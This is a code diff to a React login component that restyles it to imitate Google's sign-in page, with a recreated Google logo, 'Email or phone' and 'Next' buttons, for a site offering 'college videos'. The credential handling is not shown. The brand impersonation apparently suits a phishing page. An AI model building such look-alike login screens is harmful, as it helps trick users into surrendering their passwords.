@@ -26,7 +26,7 @@ export default function Login() {
     }
 
     if (password.length < 6) {
-      setError("Fill The Correct Details");
+      setError("Password must be at least 6 characters");
       return;
     }
 
@@ -44,43 +44,62 @@ export default function Login() {
   };
 
   return (
-    <div className="login-wrapper">
-      <div className="login-card">
-        <img
-          src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png"
-          alt="Google"
-        />
-        <h2>Verified Access</h2>
-        <p>Sign In To Continue.</p>
+    <div className="google-login-wrapper">
+      <div className="google-login-container">
+        <div className="google-logo">
+          <svg width="75" height="24" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+            <text x="0" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#4285F4">G</text>
+            <text x="18" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#EA4335">o</text>
+            <text x="32" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#FBBC05">o</text>
+            <text x="46" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#4285F4">g</text>
+            <text x="60" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#34A853">l</text>
+            <text x="68" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#EA4335">e</text>
+          </svg>
+        </div>
 
-        {error && <p style={{ color: "red", fontSize: "14px" }}>{error}</p>}
+        <h1 className="google-login-title">Sign in</h1>
+        <p className="google-login-subtitle">Access your college videos</p>
 
-        <input
-          placeholder="Enter Your Email"
-          value={email}
-          onChange={(e) => setEmail(e.target.value)}
-          type="email"
-        />
-        
-        <div className="password-input-wrapper">
+        {error && <div className="google-error-message">{error}</div>}
+
+        <div className="google-form-group">
           <input
-            placeholder="Enter Your Password"
+            className="google-input"
+            placeholder="Email or phone"
+            value={email}
+            onChange={(e) => setEmail(e.target.value)}
+            type="email"
+          />
+        </div>
+
+        <div className="google-form-group password-group">
+          <input
+            className="google-input"
+            placeholder="Enter password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
             type={showPassword ? "text" : "password"}
           />
           <button
             type="button"
-            className="toggle-password"
+            className="google-toggle-password"
             onClick={() => setShowPassword(!showPassword)}
+            title={showPassword ? "Hide password" : "Show password"}
           >
             {showPassword ? "👁️" : "👁️‍🗨️"}
           </button>
         </div>
 
-        <button onClick={handleLogin} disabled={loading}>
-          {loading ? "Verifying..." : "Continue"}
-        </button>
+        <div className="google-button-group">
+          <button className="google-button-secondary">Create account</button>
+          <button 
+            className="google-button-primary" 
+            onClick={handleLogin} 
+            disabled={loading}
+          >
+            {loading ? "Signing in..." : "Next"}
+          </button>
+        </div>
       </div>
     </div>
   );
